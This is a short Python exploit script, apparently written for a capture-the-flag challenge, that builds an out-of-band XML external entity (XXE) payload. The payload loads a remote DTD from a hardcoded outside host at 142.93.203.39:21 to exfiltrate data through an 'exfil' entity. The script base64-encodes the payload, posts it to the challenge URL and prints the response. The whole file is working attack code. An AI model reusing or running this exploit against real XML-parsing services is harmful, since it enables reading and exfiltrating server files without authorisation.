import requests
from base64 import b64encode, b64decode
from urllib.parse import quote
import sys

def exploit(url, host):

    #Headers
    headers = {
      'Content-Type': 'application/x-www-form-urlencoded'
    }

    #Craft the payload
    payload = f'<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY % sp SYSTEM "http://{host}/exp.xml">%sp;%param1;]><r>&exfil;</r>'.encode('ascii')

    #print the payload
    print("[+] Payload:")
    print(payload.decode())
    print()

    #Encode payload to base64
    payload = {"xml":b64encode(payload).decode('ascii')}

    #print the payload encoded
    print("[+] Payload encoded:")
    print(payload)
    print()

    #Send the payload
    print(f"[*] Sending payload to:", url)
    r = requests.post(url, data=payload, headers=headers)

    #Print response data
    print(f"[+] Status:", r.status_code)
    print(f"[+] Message:\n"+ r.content.decode())
    print(f"[+] Time:", r.elapsed.total_seconds())
    print(f"[+] Headers:")
    for i in r.headers:
        print("\t",i, ":", r.headers[i])

if __name__ == '__main__':
    #Challenge Url
    url = "http://securelogin.challenge.fi:8880/xml.php"

    #OOB Host
    host = "142.93.203.39:21"

    #Php payload checker
    check_url = "http://localhost:8081"

    if len(sys.argv) == 1:
        print("[!] Usage: python exploit.py <option>")
        sys.exit()
    if sys.argv[1] == "t":
        exploit(check_url, host)
    if sys.argv[1] == "e":
        exploit(url, host)
